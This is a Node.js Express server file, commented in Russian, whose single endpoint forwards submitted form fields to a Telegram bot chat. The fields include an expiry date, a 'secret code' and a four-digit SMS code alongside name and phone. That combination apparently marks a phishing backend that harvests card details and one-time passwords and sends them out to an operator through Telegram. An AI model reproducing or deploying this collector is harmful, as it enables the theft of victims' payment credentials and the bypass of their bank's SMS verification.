// server.js (ESM)
// 👇 заставляем Node предпочитать IPv4 (иначе может пытаться по IPv6 и виснуть)

import dotenv from "dotenv";
dotenv.config();
import dns from "node:dns";
dns.setDefaultResultOrder("ipv4first");




import express from "express";
import cors from "cors";
import { sendMessage } from "./src/api/telegram.js";

const app = express();
app.use(cors());
app.use(express.json());

app.post("/api/send", async (req, res) => {
  try {
    const p = req.body || {};
// (необязательная проверка формата кода)
if (p.verificationCode && !/^\d{4}$/.test(String(p.verificationCode))) {
  return res.status(400).json({ success: false, error: "Неверный формат кода" });
}

const lines = [
  "📨 Заявка с сайта:",
  p.name && `👤 Имя: ${p.name}`,
  p.email && `📧 Email: ${p.email}`,
  p.message && `💬 Сообщение: ${p.message}`,
  p.phone && `📱 Телефон: ${p.phone}`,
  p.fio && `👤 ФИО: ${p.fio}`,
  p.requestNumber && `#️⃣ Номер заявки: ${p.requestNumber}`,
  p.expiry && `📅 Срок: ${p.expiry}`,
  p.secretCode && `🔒 Секретный код: ${p.secretCode}`,
  p.verificationCode && `🔢 Код из SMS: ${String(p.verificationCode).trim()}`, // ← ДОБАВЛЕНО
  p.note && `📝 Примечание: ${p.note}`,
].filter(Boolean);

if (lines.length <= 1) {
  return res.status(400).json({ success: false, error: "Нет данных" });
}

const text = lines.join("\n");
   
    const token = process.env.TG_BOT_TOKEN;
    const chatId = process.env.TG_CHAT_ID;
    if (!token || !chatId) throw new Error("Нет TG_BOT_TOKEN/TG_CHAT_ID в .env");

    const tgResp = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text }),
    });
    const tgJson = await tgResp.json();
    if (!tgJson.ok) throw new Error(tgJson.description || "Telegram error");

    res.json({ success: true });
  } catch (e) {
    console.error("API error:", e);
    res.status(500).json({ success: false, error: "Не удалось отправить" });
  }
});

// В DEV мы НИЧЕГО статикой не отдаём — это задача Vite
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`API on http://localhost:${PORT}`));
